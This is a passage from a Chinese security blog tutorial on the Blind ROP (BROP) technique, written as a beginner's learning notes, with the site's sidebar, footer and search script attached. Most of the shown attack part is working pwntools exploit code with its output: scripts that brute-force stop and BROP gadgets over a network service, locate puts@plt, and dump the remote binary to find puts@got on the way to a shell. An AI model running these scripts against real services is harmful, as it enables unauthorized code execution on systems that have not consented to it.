+<p>运行结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[x] Opening connection to 10.112.26.131 on port 1000</span><br><span class="line">[x] Opening connection to 10.112.26.131 on port 1000: Trying 10.112.26.131</span><br><span class="line">[+] Opening connection to 10.112.26.131 on port 1000: Done</span><br><span class="line">[*] Closed connection to 10.112.26.131 port 1000</span><br><span class="line">[+] bad address: 0x400685</span><br><span class="line">[x] Opening connection to 10.112.26.131 on port 1000</span><br><span class="line">[x] Opening connection to 10.112.26.131 on port 1000: Trying 10.112.26.131</span><br><span class="line">[+] Opening connection to 10.112.26.131 on port 1000: Done</span><br><span class="line">[*] Closed connection to 10.112.26.131 port 1000</span><br><span class="line">[+] bad address: 0x400686</span><br><span class="line">[x] Opening connection to 10.112.26.131 on port 1000</span><br><span class="line">[x] Opening connection to 10.112.26.131 on port 1000: Trying 10.112.26.131</span><br><span class="line">[+] Opening connection to 10.112.26.131 on port 1000: Done</span><br><span class="line">[*] stop gadget address: 0x400686</span><br><span class="line">[*] main address: 0x400686</span><br><span class="line">[Finished in 16.3s]</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>如果使用此代码可以在 print(“[*] stop gadget address: 0x%x” % addr)后加一句sleep(10)，获取其他的stop gadget就方便了，这里补充三个（用main真的是画蛇添足）：<br>[*] stop gadget address: 0x40054c<br>[*] stop gadget address: 0x40054e<br>[*] stop gadget address: 0x40054f<br>stop gadget的寻找代码补上了，不难理解，为了画面优美（不然除了黑就是白，太单调了）补充一副运行图</p>
+</blockquote>
+<p><img src="/image/20200907/image8.png" alt="image"></p>
+<blockquote>
+<p>有了stop gadget那么就继续寻找brop gadget，这里给出代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">def getBropGadget(base_addr, stop_gadget):</span><br><span class="line">    addr = base_addr</span><br><span class="line">    while True:</span><br><span class="line">        payload = p64(0) * 9 + p64(addr) + p64(0) * 6 + p64(stop_gadget) + p64(0) * 10</span><br><span class="line">        try:</span><br><span class="line">            sh = remote(&apos;10.112.26.131&apos;, 1000)</span><br><span class="line">            sh.recvuntil(&apos;WelCome my friend,Do you know password?\n&apos;)</span><br><span class="line">            sh.sendline(payload)</span><br><span class="line">            sh.recvline()</span><br><span class="line">            sh.close()</span><br><span class="line">            print(&quot;find address: 0x%x&quot; % addr)</span><br><span class="line">            try:    </span><br><span class="line">                payload = p64(0) * 9 + p64(addr) + p64(0) * 10</span><br><span class="line">                sh = remote(&apos;10.112.26.131&apos;, 1000)</span><br><span class="line">                sh.recvline()</span><br><span class="line">                sh.sendline(payload)</span><br><span class="line">                sh.recvline()</span><br><span class="line">                sh.close()</span><br><span class="line">                print(&quot;bad address: 0x%x&quot; % addr)</span><br><span class="line">            except:</span><br><span class="line">                sh.close()</span><br><span class="line">                print(&quot;final gadget address: 0x%x&quot; % addr)</span><br><span class="line">                return addr</span><br><span class="line">        except:</span><br><span class="line">            sh.close()</span><br><span class="line">        addr += 1</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<p>可以发现，find address会有不少个，所以我们检查是有必要的，这里给出final gadget address运行结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[x] Opening connection to 10.112.26.131 on port 1000</span><br><span class="line">[x] Opening connection to 10.112.26.131 on port 1000: Trying 10.112.26.131</span><br><span class="line">[+] Opening connection to 10.112.26.131 on port 1000: Done</span><br><span class="line">[*] Closed connection to 10.112.26.131 port 1000</span><br><span class="line">find address: 0x40079a</span><br><span class="line">[x] Opening connection to 10.112.26.131 on port 1000</span><br><span class="line">[x] Opening connection to 10.112.26.131 on port 1000: Trying 10.112.26.131</span><br><span class="line">[+] Opening connection to 10.112.26.131 on port 1000: Done</span><br><span class="line">[*] Closed connection to 10.112.26.131 port 1000</span><br><span class="line">final gadget address: 0x40079a</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>这里找到了上图中popq %rbx的地址，偏移9后即popq %rdi的地址，也就是0x4007a3。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ps：</span><br><span class="line">可能会对payload有些不解，这里解释一下：</span><br><span class="line">前面测出来栈溢出的长度是72，那么使用payload = &apos;a&apos; * 72 +，但是在此时（ payload = &apos;a&apos; * 72 + p64(addr) + p64(0) * 6 + p64(stop_gadget) + p64(0) * 10）会报错：can only concatenate str (not &quot;int&quot;) to str，由于类型不一样造成的。</span><br><span class="line">解决办法：直接使用payload = p64(0) * 9 + p64(addr) + p64(0) * 6 + p64(stop_gadget) + p64(0) * 10</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<p>解决第二个问题：如何获取put@got表的内容。</p>
+<blockquote>
+<p>很眼熟的问题，在基本rop方法中学到过，具体请见<a href="https://mp.weixin.qq.com/s/hl7l6pdw6aIbfzN66KPv1w" target="_blank" rel="noopener">上一篇文章</a>，只要找到put()（有输出功能的函数，当然也可以write()）所在的plt表，<strong>那么在这个场景中怎么找到put@plt就是关键的一步。</strong><br>在上一个小问题中也说到了，只要利用stop gadget等构造合适的payload即可获取到我们想要的useful gadget。<br>此时怎么构造呢？<br>第一步就是先了解一下plt表，在之前的文章我们探讨过，具体详见此<a href="http://bey0nd.xyz/2020/02/08/1/" target="_blank" rel="noopener">文章</a>，在这里简单说一下，plt 表的一般在可执行程序开始的地方，他有一个特点就是具有比较规整的结构，每一个表项都是 16 字节，每个表项的 6 字节偏移处，是该表项对应函数的解析路径，也就是got表的位置。另外，大部分的PLT项都不会因为传进来的参数的原因crash，因为它们很多都是系统调用，都会对参数进行检查，如果有错误会返回EFAULT而已，并不会造成进程crash。<strong>所以若发现好多条连续的16个字节对齐的地址都不会造成进程crash，而且这些地址加6得到的地址也不会造成进程crash，那么很有可能这就是某个PLT对应的项了。</strong> 当然我们也可以这样，如下图：</p>
+</blockquote>
+<p><img src="/image/20200907/image9.png" alt="image"></p>
+<blockquote>
+<p>那么<strong>contexts（过程：rdi -&gt; context_addr -&gt; contexts）就会打在荧屏上了，只需判断此条件即可获取put@plt，这里给</strong>出代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">def getPutPlt(base_addr, stop_gadget, pop_rdi_addr):</span><br><span class="line">    addr = base_addr</span><br><span class="line">    while True:</span><br><span class="line">        payload = p64(0) * 9 + p64(pop_rdi_addr) + p64(0x400001) + p64(addr) + p64(stop_gadget)</span><br><span class="line">        sh = remote(&apos;10.112.26.131&apos;, 1000)</span><br><span class="line">        sh.recvuntil(&apos;WelCome my friend,Do you know password?\n&apos;)</span><br><span class="line">        sh.send(payload)</span><br><span class="line">        try:</span><br><span class="line">            byte = sh.recv()</span><br><span class="line">        except:</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += 1</span><br><span class="line">            continue</span><br><span class="line">        c = byte.decode()</span><br><span class="line">        if c.startswith(&apos;ELF&apos;):</span><br><span class="line">            print(&quot;[*] put@plt address: 0x%x&quot; % addr)</span><br><span class="line">            return addr</span><br><span class="line">        addr += 1</span><br><span class="line">        sh.close()</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<p>运行结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[x] Opening connection to 10.112.26.131 on port 1000</span><br><span class="line">[x] Opening connection to 10.112.26.131 on port 1000: Trying 10.112.26.131</span><br><span class="line">[+] Opening connection to 10.112.26.131 on port 1000: Done</span><br><span class="line">[*] put@plt address: 0x400545</span><br><span class="line">[Finished in 11.9s]</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>这里需要解释一下，<strong>为什么是0x400001和startswith(‘ELF’)。</strong><br>首先要保证此地址在程序中是有的，然后每个程序该地址中内容都相同，因为byte.startswith(‘\x7fELF’)会报错，不如从第一位开始。下面附图一张，解释为什么是ELF，更有说服力。<br><img src="/image/20200907/image10.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>有了put@plt，就像<a href="http://bey0nd.xyz/2020/03/15/1/" target="_blank" rel="noopener">上一篇</a>所说到的，将put@got放入rdi，即可取得put的真实地址，<strong>但是问题又来了如何找到put@got呢？</strong><br>当然就是这个方法的特色啦，<strong>使用put函数将plt表段给dump下来，此时还可以顺便把data表段dump下来，万一有“/bin/sh”呢。</strong> 至于地址范围可以随便找一个程序放入ida看一下。<br>代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">def dump(base_addr, stop_gadget, pop_rdi_addr, put_plt_addr):</span><br><span class="line">    addr = base_addr</span><br><span class="line">    while addr &lt; 0x401000:</span><br><span class="line">        payload = p64(0) * 9 + p64(pop_rdi_addr) + p64(addr) + p64(put_plt_addr) + p64(stop_gadget)</span><br><span class="line">        sh = remote(&apos;10.112.26.131&apos;, 1000)</span><br><span class="line">        sh.recvuntil(&apos;WelCome my friend,Do you know password?\n&apos;)</span><br><span class="line">        sh.send(payload) </span><br><span class="line">data = sh.recv(timeout=0.1)  </span><br><span class="line">        if data == &quot;\n&quot;:</span><br><span class="line">            data = &quot;\x00&quot;</span><br><span class="line">        elif data[-1] == &quot;\n&quot;:</span><br><span class="line">            data = data[:-1]</span><br><span class="line">        if addr == 0x400000:</span><br><span class="line">            result = data</span><br><span class="line">        else:</span><br><span class="line">            result += data</span><br><span class="line">        addr += len(data)</span><br><span class="line">        sh.close()</span><br><span class="line">    return result</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>puts 函数通过 \x00 进行截断，并且会在每一次输出末尾加上换行符 ，所以需要做一些处理，首先去掉末尾 puts 自动加上的 \n，然后有两种情况：<br>一、如果 recv 到一个 \n，说明内存中是 \x00；<br>二、如果 recv 到一个 \n\n，说明内存中是 \x0a，并且对recv进行延时。<br>将提取出来的内容写入文件中，保存到本地，然后拖入ida中，edit-&gt;segments-&gt;rebase program 将程序的基地址改为0x400000，找到偏移0x545 <strong>（为什么是这个地址呢？因为刚才获取到了put@plt，那么根据plt表特点就知道在附近啦）</strong> ，按c进行编译成汇编语言：</p>
+</blockquote>
+<p><img src="/image/20200907/image11.png" alt="image"></p>
+<blockquote>
+<p>成功得到put@got为0x601018，下面的泄漏出put真实地址和根据在libc中通过偏移找到system和”/bin/sh”字符串，以及最后的getshell部分就很简单啦，自认为之前的文章说的已经算详细了，具体请见<a href="http://bey0nd.xyz/2020/03/15/1/" target="_blank" rel="noopener">初探ROP</a>，到这里新的内容已经探讨完了。</p>
+</blockquote>
+<h1 id="0x03-尾记"><a href="#0x03-尾记" class="headerlink" title="0x03 尾记"></a>0x03 尾记</h1><blockquote>
+<p>还未入门，详细记录每个知识点，为了能更好地温故知新，也希望能帮助和我一样想要入门二进制安全的初学者，如有错误，希望大佬们指出。<br>参考：<br><a href="http://drops.xmd5.com/static/drops/tips-3071.html" target="_blank" rel="noopener">Blind Return Oriented Programming (BROP) Attack - 攻击原理</a><br><a href="http://www.scs.stanford.edu/brop/" target="_blank" rel="noopener">Blind Return Oriented Programming (BROP)</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/" target="_blank" rel="noopener">ctfwiki</a><br><a href="https://xz.aliyun.com/t/4657" target="_blank" rel="noopener">canary各种姿势绕过</a></p>
+</blockquote>
+
+      
+    </div>
+	<div>
+      
+          <div>
+     
+        <div style="text-align:center;color: #ccc;font-size:15px;">
+              -------------本文结束&感谢您的阅读-------------
+        </div>
+</div>
+      
+	</div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:</strong>
+    bey0ndm3
+  </li>
+    <li class="post-copyright-author">
+    <strong>Post title:</strong>
+    <a href="/2020/09/07/1/">再探ROP(下)</a>
+  </li>
+  <li class="post-copyright-author">
+    <strong>Publishing time:</strong>
+    2020年09月07日 - 20:09
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link:</strong>
+    <a href="http://1234xxh.github.io/2020/09/07/1/" title="再探ROP(下)">http://1234xxh.github.io/2020/09/07/1/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice: </strong>
+    All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> unless stating additionally.
+  </li>
+  <li>转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/二进制安全/" rel="tag"># 二进制安全</a>
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/栈溢出/" rel="tag"># 栈溢出</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+          <div class="wp_rating">
+            <div id="wpac-rating"></div>
+          </div>
+        
+
+        
+
+        
+          
+          <div id="needsharebutton-postbottom">
+            <span class="btn">
+              <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </span>
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/07/1/" rel="next" title="再探ROP(上)">
+                <i class="fa fa-chevron-left"></i> 再探ROP(上)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/09/08/1/" rel="prev" title="某市HW攻防演练部分总结">
+                某市HW攻防演练部分总结 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zODU3Ni8xNTEwNA=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/background.jpg"
+                alt="bey0ndm3" />
+            
+              <p class="site-author-name" itemprop="name">bey0ndm3</p>
+              <p class="site-description motion-element" itemprop="description">我的征途是星辰大海</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/virgilwjj/" title="virgilwjj" target="_blank">virgilwjj</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-前记"><span class="nav-number">1.</span> <span class="nav-text">0x00 前记</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-ret2reg"><span class="nav-number">2.</span> <span class="nav-text">0x01 ret2reg</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#起因"><span class="nav-number">2.1.</span> <span class="nav-text">起因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#原理"><span class="nav-number">2.2.</span> <span class="nav-text">原理</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-brop"><span class="nav-number">3.</span> <span class="nav-text">0x02 brop</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#概述"><span class="nav-number">3.1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#逆向思维切入"><span class="nav-number">3.2.</span> <span class="nav-text">逆向思维切入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#搭建环境"><span class="nav-number">3.2.1.</span> <span class="nav-text">搭建环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#溢出长度和爆破canary"><span class="nav-number">3.2.2.</span> <span class="nav-text">溢出长度和爆破canary</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#如何getshell"><span class="nav-number">3.2.3.</span> <span class="nav-text">如何getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#寻找直接条件"><span class="nav-number">3.2.4.</span> <span class="nav-text">寻找直接条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#寻找间接条件"><span class="nav-number">3.2.5.</span> <span class="nav-text">寻找间接条件</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-尾记"><span class="nav-number">4.</span> <span class="nav-text">0x03 尾记</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">bey0ndm3</span>
+
+  
+</div>
+
+<p>My way of tramp journey is from the galaxy's firmament to the starry ocean.</p>    <!--文字-->
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+      <div id="needsharebutton-float">
+        <span class="btn">
+          <i class="fa fa-share-alt" aria-hidden="true"></i>
+        </span>
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
